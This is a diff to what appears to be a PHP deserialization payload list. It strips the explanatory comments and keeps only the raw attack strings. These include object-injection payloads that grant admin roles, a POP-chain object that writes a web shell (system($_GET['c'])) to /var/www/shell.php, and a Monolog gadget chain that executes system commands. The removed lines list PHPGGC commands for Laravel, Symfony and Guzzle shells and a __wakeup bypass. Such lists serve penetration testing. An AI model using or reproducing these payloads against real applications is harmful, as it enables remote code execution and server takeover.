@@ -1,57 +1,7 @@
-# ============================================================
-# Insecure Deserialization — PHP unserialize()
-# ============================================================
-
-# ---- PHP Serialization Format ----
-# b:1; — boolean true
-# i:42; — integer 42
-# d:3.14; — float 3.14
-# s:5:"hello"; — string "hello"
-# a:2:{i:0;s:1:"a";i:1;s:1:"b";} — array
-# O:4:"User":1:{s:4:"name";s:5:"admin";} — object
-# N; — null
-
-# ---- Basic Object Injection ----
 O:4:"User":1:{s:4:"role";s:5:"admin";}
 O:5:"Admin":0:{}
 O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"admin";}
 
-# ---- Magic Method Abuse ----
-# __wakeup() — called on unserialize
-# __destruct() — called on object destruction
-# __toString() — called when object used as string
-# __invoke() — called when object used as function
-# __call() — called on undefined method
-
-# ---- POP Chain via __destruct ----
-# Example: write file on destruct
 O:8:"FileWrite":2:{s:4:"file";s:18:"/var/www/shell.php";s:4:"data";s:29:"<?php system($_GET['c']); ?>";}
 
-# ---- Monolog RCE (common in Laravel) ----
 O:32:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:29:"Monolog\Handler\BufferHandler":7:{s:10:"*handler";O:17:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"*socket";i:1;}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:15:"id 2>&1|tee /tmp/owned";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"*bufferSize";i:-1;s:9:"*buffer";a:1:{i:0;a:2:{i:0;s:15:"id 2>&1|tee /tmp/owned";s:5:"level";N;}}s:8:"*level";N;s:14:"*initialized";b:1;s:14:"*bufferLimit";i:-1;s:13:"*processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}
-
-# ---- PHPGGC Tool (like ysoserial for PHP) ----
-# phpggc Laravel/RCE1 system 'id'
-# phpggc Symfony/RCE4 exec 'id'
-# phpggc Guzzle/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'
-# phpggc Yii/RCE1 system 'id'
-# phpggc Slim/RCE1 system 'id'
-# phpggc Drupal/FD1 /tmp/test 'data'
-# phpggc Laravel/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'
-# phpggc CakePHP/RCE1 system 'id'
-
-# ---- Session Deserialization ----
-# PHP session files (default): /var/lib/php/sessions/sess_<PHPSESSID>
-# Session format varies by session.serialize_handler:
-# php (default): key|O:4:"User":1:{...}
-# php_serialize: a:1:{s:3:"key";O:4:"User":1:{...}}
-# php_binary: \x03keyO:4:"User":1:{...}
-
-# ---- Type Juggling with unserialize ----
-# b:0; — false (bypass if ($obj) check)
-# i:0; — 0
-# a:0:{} — empty array
-
-# ---- __wakeup CVE-2016-7124 ----
-# Bypass __wakeup by setting property count larger than actual:
-# O:8:"ClassName":1:{...}  →  O:8:"ClassName":2:{...}
